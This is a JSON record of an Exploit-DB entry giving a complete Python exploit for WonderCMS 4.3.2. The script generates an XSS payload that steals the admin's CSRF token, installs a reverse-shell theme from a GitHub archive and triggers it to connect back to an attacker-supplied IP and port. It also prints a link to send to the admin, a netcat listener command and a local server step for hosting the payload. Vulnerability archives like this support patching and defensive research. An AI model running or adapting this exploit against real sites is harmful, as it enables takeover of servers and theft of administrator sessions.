{"source": "https://www.exploit-db.com/exploits/51805", "vulnName": "Wondercms 4.3.2 - XSS to RCE", "vulnEDBID": "51805", "vulnCVE": "N/A", "author": "ANAS ZAKIR", "exploitType": "WEBAPPS", "platform": "MULTIPLE", "datePublished": "2024-02-19", "vulnContent": "# Author: prodigiousMind\n# Exploit: Wondercms 4.3.2 XSS to RCE\n\n\nimport sys\nimport requests\nimport os\nimport bs4\n\nif (len(sys.argv)<4): print(\"usage: python3 exploit.py loginURL IP_Address Port\\nexample: python3 exploit.py http://localhost/wondercms/loginURL 192.168.29.165 5252\")\nelse:\n  data = '''\nvar url = \"'''+str(sys.argv[1])+'''\";\nif (url.endsWith(\"/\")) {\n url = url.slice(0, -1);\n}\nvar urlWithoutLog = url.split(\"/\").slice(0, -1).join(\"/\");\nvar urlWithoutLogBase = new URL(urlWithoutLog).pathname; \nvar token = document.querySelectorAll('[name=\"token\"]')[0].value;\nvar urlRev = urlWithoutLogBase+\"/?installModule=https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip&directoryName=violet&type=themes&token=\" + token;\nvar xhr3 = new XMLHttpRequest();\nxhr3.withCredentials = true;\nxhr3.open(\"GET\", urlRev);\nxhr3.send();\nxhr3.onload = function() {\n if (xhr3.status == 200) {\n   var xhr4 = new XMLHttpRequest();\n   xhr4.withCredentials = true;\n   xhr4.open(\"GET\", urlWithoutLogBase+\"/themes/revshell-main/rev.php\");\n   xhr4.send();\n   xhr4.onload = function() {\n     if (xhr4.status == 200) {\n       var ip = \"'''+str(sys.argv[2])+'''\";\n       var port = \"'''+str(sys.argv[3])+'''\";\n       var xhr5 = new XMLHttpRequest();\n       xhr5.withCredentials = true;\n       xhr5.open(\"GET\", urlWithoutLogBase+\"/themes/revshell-main/rev.php?lhost=\" + ip + \"&lport=\" + port);\n       xhr5.send();\n       \n     }\n   };\n }\n};\n'''\n  try:\n    open(\"xss.js\",\"w\").write(data)\n    print(\"[+] xss.js is created\")\n    print(\"[+] execute the below command in another terminal\\n\\n----------------------------\\nnc -lvp \"+str(sys.argv[3]))\n    print(\"----------------------------\\n\")\n    XSSlink = str(sys.argv[1]).replace(\"loginURL\",\"index.php?page=loginURL?\")+\"\\\"></form><script+src=\\\"http://\"+str(sys.argv[2])+\":8000/xss.js\\\"></script><form+action=\\\"\"\n    XSSlink = XSSlink.strip(\" \")\n    print(\"send the below link to admin:\\n\\n----------------------------\\n\"+XSSlink)\n    print(\"----------------------------\\n\")\n\n    print(\"\\nstarting HTTP server to allow the access to xss.js\")\n    os.system(\"python3 -m http.server\\n\")\n  except: print(data,\"\\n\",\"//write this to a file\")\n            "}